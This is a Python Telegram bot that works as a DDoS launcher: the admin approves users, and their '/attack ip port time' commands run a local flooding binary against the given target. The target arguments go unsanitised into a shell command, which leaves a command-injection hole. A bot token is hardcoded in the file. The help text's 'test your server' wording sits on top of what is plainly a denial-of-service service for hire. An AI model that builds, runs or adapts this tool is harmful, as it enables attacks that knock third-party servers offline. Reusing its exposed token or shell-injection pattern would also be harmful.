import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '8042326539:AAH4CdJsBrO9BM72u86Pv2v7u35ttokyqMs'
ADMIN_USER_ID = 5486683891
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to GODxCHEATS DDOS Bot! 🔥*\n"
        "*🚀 The ultimate tool to test your server's resilience against DDOS attacks.*\n\n"
        "*✨ Commands Available:*\n"
        "*➤ /approve <user_id>  ➔ Approve a user for DDOS attack usage (Admin Only) 👑*\n"
        "*➤ /remove <user_id>  ➔ Remove a user from DDOS attack usage (Admin Only) ⚠️*\n"
        "*➤ /attack <ip> <port> <time> ➔ Launch a DDOS attack (Approved Users Only) 💥*\n"
        "*➤ /help ➔ Display detailed usage instructions for this bot 🧑‍💻*\n\n"
        "*💬 Owner: *\n"
        "*📢 Channel: ()*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*❓ How to Use the GODxCHEATS DDOS Bot?*\n\n"
        "*🔑 Commands:*\n\n"
        "*➤ /approve <user_id>* ➔ Approve a user for using the attack functionality (Admin Only) 👑\n"
        "*➤ /remove <user_id>* ➔ Remove a user from attack usage (Admin Only) ⚠️\n"
        "*➤ /attack <ip> <port> <time>* ➔ Launch a DDOS attack (Approved Users Only) 💥\n"
        "*➤ /help* ➔ Shows detailed instructions on how to use the bot 🧑‍💻\n\n"
        "*⚠️ Important Notes:*\n"
        "*1. Only approved users can launch attacks.*\n"
        "*2. Use responsibly and with permission, DDoS attacks are illegal without consent.*\n"
        "*3. Contact the bot owner  for assistance or clarifications.*\n\n"
        "*⚡ Owner: *\n"
        "*📢 Channel: ()*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to get permission to use this command. Contact .*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Use /approve <user_id> to approve a user.*", parse_mode='Markdown')
        return

    user_id = args[0].strip()
    users.add(user_id)
    save_users(users)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {user_id} has been approved! 🎉* 🎯", parse_mode='Markdown')

async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to get permission to use this command. Contact number se.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Use /remove <user_id> to remove a user.*", parse_mode='Markdown')
        return

    user_id = args[0].strip()
    users.discard(user_id)
    save_users(users)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {user_id} has been removed! 🗑️*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, time, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {time} 350",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}* 😞", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text=(
            "*🔥 Attack Completed ✅*\n"
            "*⚡ Target IP: {ip}*\n"
            "*⚡ Port: {port}*\n"
            "*⚡ Duration: {time} seconds*\n"
            "*⚡ The attack has been successfully finished and the target has been impacted! 💥*\n"
            "*🔥 Owner *\n"
            "* *"
        ).format(ip=ip, port=port, time=time), parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*🤡 You need to get permission to use this bot. Contact owner .*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*🌟 Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
        return

    ip, port, time = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ Attack Launch Initiated ✅*\n"
        f"*⭐ Target IP: {ip}*\n"
        f"*⭐ Target Port: {port}*\n"
        f"*⭐ Attack Duration: {time} seconds*\n"
        f"*🔥 Owner *\n"
        f"* *"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()
